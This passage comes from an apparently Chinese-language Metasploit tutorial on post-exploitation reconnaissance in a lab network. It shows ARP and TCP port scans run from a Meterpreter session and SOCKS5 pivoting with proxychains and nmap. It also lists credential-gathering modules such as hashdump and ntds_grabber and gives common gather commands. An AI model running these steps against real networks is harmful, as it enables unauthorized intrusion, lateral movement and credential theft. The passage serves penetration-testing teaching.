       Name: Windows Gather ARP Scanner
     Module: post/windows/gather/arp_scanner
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Carlos Perez <span class="token operator">&lt;</span>carlos_perez@darkoperator.com<span class="token operator">></span>

Compatible session types:
  Meterpreter

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    <span class="token function">yes</span>       The target address range or CIDR identifier
  SESSION                   <span class="token function">yes</span>       The session to run this module on.
  THREADS  10               no        The number of concurrent threads

Description:
  This Module will perform an ARP scan <span class="token keyword">for</span> a given IP range through a 
  Meterpreter Session.



Module options <span class="token punctuation">(</span>post/windows/gather/arp_scanner<span class="token punctuation">)</span>:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    <span class="token function">yes</span>       The target address range or CIDR identifier
   SESSION                   <span class="token function">yes</span>       The session to run this module on.
   THREADS  10               no        The number of concurrent threads

meterpreter <span class="token operator">></span> run post/windows/gather/arp_scanner RHOSTS<span class="token operator">=</span>192.168.9.0/24 THREADS<span class="token operator">=</span>50

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running module against SERVER
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ARP Scanning 192.168.9.0/24
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: 192.168.9.50 MAC 00:0c:29:23:57:f3 <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: 192.168.9.101 MAC 00:0c:29:fb:6f:2e <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: 192.168.9.254 MAC 00:0c:29:8c:0f:e7 <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span>
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对收集到的特定主机<code>192.168.9.101</code>进行端口扫描</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> info auxiliary/scanner/portscan/tcp 

       Name: TCP Port Scanner
     Module: auxiliary/scanner/portscan/tcp
    License: Metasploit Framework License <span class="token punctuation">(</span>BSD<span class="token punctuation">)</span>
       Rank: Normal

Provided by:
  hdm <span class="token operator">&lt;</span>x@hdm.io<span class="token operator">></span>
  kris katterjohn <span class="token operator">&lt;</span>katterjohn@gmail.com<span class="token operator">></span>

Check supported:
  No

Basic options:
  Name         Current Setting  Required  Description
  ----         ---------------  --------  -----------
  CONCURRENCY  10               <span class="token function">yes</span>       The number of concurrent ports to check per host
  DELAY        0                <span class="token function">yes</span>       The delay between connections, per thread, <span class="token keyword">in</span> milliseconds
  JITTER       0                <span class="token function">yes</span>       The delay jitter factor <span class="token punctuation">(</span>maximum value by <span class="token function">which</span> to +/- DELAY<span class="token punctuation">)</span> <span class="token keyword">in</span> milliseconds.
  PORTS        1-10000          <span class="token function">yes</span>       Ports to scan <span class="token punctuation">(</span>e.g. 22-25,80,110-900<span class="token punctuation">)</span>
  RHOSTS                        <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
  THREADS      1                <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per host<span class="token punctuation">)</span>
  TIMEOUT      1000             <span class="token function">yes</span>       The socket connect <span class="token function">timeout</span> <span class="token keyword">in</span> milliseconds

Description:
  Enumerate <span class="token function">open</span> TCP services by performing a full TCP connect on each 
  port. This does not need administrative privileges on the <span class="token function">source</span> 
  machine, <span class="token function">which</span> may be useful <span class="token keyword">if</span> pivoting.



Module options <span class="token punctuation">(</span>auxiliary/scanner/portscan/tcp<span class="token punctuation">)</span>:

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               <span class="token function">yes</span>       The number of concurrent ports to check per host
   DELAY        0                <span class="token function">yes</span>       The delay between connections, per thread, <span class="token keyword">in</span> milliseconds
   JITTER       0                <span class="token function">yes</span>       The delay jitter factor <span class="token punctuation">(</span>maximum value by <span class="token function">which</span> to +/- DELAY<span class="token punctuation">)</span> <span class="token keyword">in</span> milliseconds.
   PORTS        1-10000          <span class="token function">yes</span>       Ports to scan <span class="token punctuation">(</span>e.g. 22-25,80,110-900<span class="token punctuation">)</span>
   RHOSTS                        <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   THREADS      1                <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per host<span class="token punctuation">)</span>
   TIMEOUT      1000             <span class="token function">yes</span>       The socket connect <span class="token function">timeout</span> <span class="token keyword">in</span> milliseconds

meterpreter <span class="token operator">></span> run auxiliary/scanner/portscan/tcp RHOSTS<span class="token operator">=</span>192.168.9.101 THREADS<span class="token operator">=</span>50 TIMEOUT<span class="token operator">=</span>500 RPORTS<span class="token operator">=</span>1-65535

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:139 - TCP OPEN
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:135 - TCP OPEN
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:445 - TCP OPEN
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:3389 - TCP OPEN
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="系统代理-内网收集"><a href="#系统代理-内网收集" class="headerlink" title="系统代理+内网收集"></a>系统代理+内网收集</h3><p>实战：配置系统代理，对内网进行信息收集（前提：在www服务器的meterpreter会话中已配置内网的路由转发功能）</p>
<ul>
<li>socks5系统代理</li>
</ul>
<p>在MSF中设置并启动本地系统代理：<code>127.0.0.1:1080</code></p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use auxiliary/server/socks5 
msf5 auxiliary<span class="token punctuation">(</span>server/socks5<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>auxiliary/server/socks5<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password <span class="token keyword">for</span> SOCKS5 listener
   SRVHOST   0.0.0.0          <span class="token function">yes</span>       The address to listen on
   SRVPORT   1080             <span class="token function">yes</span>       The port to listen on
   USERNAME                   no        Proxy username <span class="token keyword">for</span> SOCKS5 listener


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run SOCKS5 proxy

msf5 auxiliary<span class="token punctuation">(</span>server/socks5<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> SRVHOST 127.0.0.1
SRVHOST <span class="token operator">=</span><span class="token operator">></span> 127.0.0.1
msf5 auxiliary<span class="token punctuation">(</span>server/socks5<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>auxiliary/server/socks5<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password <span class="token keyword">for</span> SOCKS5 listener
   SRVHOST   127.0.0.1        <span class="token function">yes</span>       The address to listen on
   SRVPORT   1080             <span class="token function">yes</span>       The port to listen on
   USERNAME                   no        Proxy username <span class="token keyword">for</span> SOCKS5 listener


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run SOCKS5 proxy


msf5 auxiliary<span class="token punctuation">(</span>server/socks5<span class="token punctuation">)</span> <span class="token operator">></span> 
msf5 auxiliary<span class="token punctuation">(</span>server/socks5<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job 0.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the socks5 proxy server
msf5 auxiliary<span class="token punctuation">(</span>server/socks5<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后，在本地配置proxychains软件代理，使得proxychains代理的流量由MSF代理请求转发</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># vim /etc/proxychains.conf</span>
<span class="token punctuation">[</span>ProxyList<span class="token punctuation">]</span>
<span class="token comment" spellcheck="true"># add proxy here ...</span>
<span class="token comment" spellcheck="true"># meanwile</span>
<span class="token comment" spellcheck="true"># defaults set to "tor"</span>
socks5     127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>内网信息收集</li>
</ul>
<p>使用已配置的proxychains代理工具进行协助对内网进行信息收集</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># proxychains nmap -Pn -sT 192.168.9.101</span>
ProxyChains-3.1 <span class="token punctuation">(</span>http://proxychains.sf.net<span class="token punctuation">)</span>
Starting Nmap 7.80 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2020-06-25 10:20 EDT
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:256-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:8080-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:554-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:1720-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:110-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:135-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-OK
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:5900-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:199-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:21-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:8888-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:80-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:3389-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-OK
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:111-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:139-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-OK
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:3306-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:143-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:443-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:23-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:587-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:113-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:995-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:53-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:25-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:993-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:1025-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:22-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:445-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-OK
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:1723-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:3920-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:2393-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:49160-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:49167-<span class="token operator">&lt;</span>--timeout
<span class="token operator">|</span>S-chain<span class="token operator">|</span>-<span class="token operator">&lt;</span><span class="token operator">></span>-127.0.0.1:1080-<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">></span>-192.168.9.101:1433-<span class="token operator">&lt;</span>--timeout<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在Meterpreter中可以使用后渗透<code>post</code>模块提供的模块进行后渗透阶段专门的信息收集（注意：需提前设置好路由转发）(注意：这里也可以使用其它模块<code>auxiliary</code>辅助模块进行扫描信息收集)</p>
<ul>
<li>后渗透模块</li>
</ul>
<p>查看post模块信息收集脚本</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># ls /usr/share/metasploit-framework/modules/post/windows/gather/</span>
ad_to_sqlite.rb                     enum_dirperms.rb              enum_unattend.rb
arp_scanner.rb                      enum_domain_group_users.rb    file_from_raw_ntfs.rb
bitcoin_jacker.rb                   enum_domain.rb                forensics
bitlocker_fvek.rb                   enum_domains.rb               hashdump.rb
bloodhound.rb                       enum_domain_tokens.rb         local_admin_search_enum.rb
cachedump.rb                        enum_domain_users.rb          lsa_secrets.rb
checkvm.rb                          enum_emet.rb                  make_csv_orgchart.rb
credentials                         enum_files.rb                 memory_grep.rb
dnscache_dump.rb                    enum_hostfile.rb              netlm_downgrade.rb
dumplinks.rb                        enum_ie.rb                    ntds_grabber.rb
enum_ad_bitlocker.rb                enum_logged_on_users.rb       ntds_location.rb
enum_ad_computers.rb                enum_ms_product_keys.rb       outlook.rb
enum_ad_groups.rb                   enum_muicache.rb              phish_windows_credentials.rb
enum_ad_managedby_groups.rb         enum_patches.rb               psreadline_history.rb
enum_ad_service_principal_names.rb  enum_powershell_env.rb        resolve_sid.rb
enum_ad_to_wordlist.rb              enum_prefetch.rb              reverse_lookup.rb
enum_ad_user_comments.rb            enum_proxy.rb                 screen_spy.rb
enum_ad_users.rb                    enum_putty_saved_sessions.rb  smart_hashdump.rb
enum_applications.rb                enum_services.rb              tcpnetstat.rb
enum_artifacts.rb                   enum_shares.rb                usb_history.rb
enum_av_excluded.rb                 enum_snmp.rb                  win_privs.rb
enum_chrome.rb                      enum_termserv.rb              wmic_command.rb
enum_computers.rb                   enum_tokens.rb                word_unc_injector.rb
enum_db.rb                          enum_tomcat.rb
enum_devices.rb                     enum_trusted_locations.rb
 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># ls /usr/share/metasploit-framework/modules/post/linux/gather/</span>
checkcontainer.rb  enum_nagios_xi.rb    enum_users_history.rb     openvpn_credentials.rb
checkvm.rb         enum_network.rb      gnome_commander_creds.rb  phpmyadmin_credsteal.rb
ecryptfs_creds.rb  enum_protections.rb  gnome_keyring_dump.rb     pptpd_chap_secrets.rb
enum_commands.rb   enum_psk.rb          hashdump.rb               tor_hiddenservices.rb
enum_configs.rb    enum_system.rb       mount_cifs_creds.rb
 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>常用的信息收集脚本</p>
<pre class="line-numbers language-bash"><code class="language-bash">run post/windows/gather/arp_scanner 参数 <span class="token comment" spellcheck="true">#查看内网主机</span>
run post/windows/gather/checkvm <span class="token comment" spellcheck="true">#是否虚拟机</span>
run post/linux/gather/checkvm <span class="token comment" spellcheck="true">#是否虚拟机</span>
run post/windows/gather/forensics/enum_drives <span class="token comment" spellcheck="true">#查看分区</span>
run post/windows/gather/enum_applications <span class="token comment" spellcheck="true">#获取安装软件信息</span>
run post/windows/gather/dumplinks   <span class="token comment" spellcheck="true">#获取最近的文件操作</span>
run post/windows/gather/enum_ie  <span class="token comment" spellcheck="true">#获取IE缓存</span>
run post/windows/gather/enum_chrome   <span class="token comment" spellcheck="true">#获取Chrome缓存</span>
run post/windows/gather/enum_patches  <span class="token comment" spellcheck="true">#补丁信息</span>
run post/windows/gather/enum_domain  <span class="token comment" spellcheck="true">#查找域控</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>辅助模块</li>
</ul>
<p>auxiliary辅助模块在run的情况下，后面需要接配置选项参数，才能进行扫描收集。（注意：注意：需提前设置好路由转发）（注意：这里使用辅助模块，可以在meterpreter会话中直接<code>run+模块+参数</code>运行，也可以在msf控制台中<code>use 模块+配置+run</code>运行）</p>
<p>meterpreter会话内网收集</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> info auxiliary/scanner/portscan/tcp 

       Name: TCP Port Scanner
     Module: auxiliary/scanner/portscan/tcp
    License: Metasploit Framework License <span class="token punctuation">(</span>BSD<span class="token punctuation">)</span>
       Rank: Normal

Provided by:
  hdm <span class="token operator">&lt;</span>x@hdm.io<span class="token operator">></span>
  kris katterjohn <span class="token operator">&lt;</span>katterjohn@gmail.com<span class="token operator">></span>

Check supported:
  No

Basic options:
  Name         Current Setting  Required  Description
  ----         ---------------  --------  -----------
  CONCURRENCY  10               <span class="token function">yes</span>       The number of concurrent ports to check per host
  DELAY        0                <span class="token function">yes</span>       The delay between connections, per thread, <span class="token keyword">in</span> milliseconds
  JITTER       0                <span class="token function">yes</span>       The delay jitter factor <span class="token punctuation">(</span>maximum value by <span class="token function">which</span> to +/- DELAY<span class="token punctuation">)</span> <span class="token keyword">in</span> milliseconds.
  PORTS        1-10000          <span class="token function">yes</span>       Ports to scan <span class="token punctuation">(</span>e.g. 22-25,80,110-900<span class="token punctuation">)</span>
  RHOSTS                        <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
  THREADS      1                <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per host<span class="token punctuation">)</span>
  TIMEOUT      1000             <span class="token function">yes</span>       The socket connect <span class="token function">timeout</span> <span class="token keyword">in</span> milliseconds

Description:
  Enumerate <span class="token function">open</span> TCP services by performing a full TCP connect on each 
  port. This does not need administrative privileges on the <span class="token function">source</span> 
  machine, <span class="token function">which</span> may be useful <span class="token keyword">if</span> pivoting.



Module options <span class="token punctuation">(</span>auxiliary/scanner/portscan/tcp<span class="token punctuation">)</span>:

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               <span class="token function">yes</span>       The number of concurrent ports to check per host
   DELAY        0                <span class="token function">yes</span>       The delay between connections, per thread, <span class="token keyword">in</span> milliseconds
   JITTER       0                <span class="token function">yes</span>       The delay jitter factor <span class="token punctuation">(</span>maximum value by <span class="token function">which</span> to +/- DELAY<span class="token punctuation">)</span> <span class="token keyword">in</span> milliseconds.
   PORTS        1-10000          <span class="token function">yes</span>       Ports to scan <span class="token punctuation">(</span>e.g. 22-25,80,110-900<span class="token punctuation">)</span>
   RHOSTS                        <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   THREADS      1                <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per host<span class="token punctuation">)</span>
   TIMEOUT      1000             <span class="token function">yes</span>       The socket connect <span class="token function">timeout</span> <span class="token keyword">in</span> milliseconds

meterpreter <span class="token operator">></span> run auxiliary/scanner/portscan/tcp RHOSTS<span class="token operator">=</span>192.168.9.101 THREADS<span class="token operator">=</span>50 TIMEOUT<span class="token operator">=</span>500 RPORTS<span class="token operator">=</span>1-65535

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:139 - TCP OPEN
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:135 - TCP OPEN
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:445 - TCP OPEN
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:3389 - TCP OPEN
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>msf终端内网收集</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use auxiliary/scanner/portscan/tcp
msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOSTS 192.168.9.101
RHOSTS <span class="token operator">=</span><span class="token operator">></span> 192.168.9.101
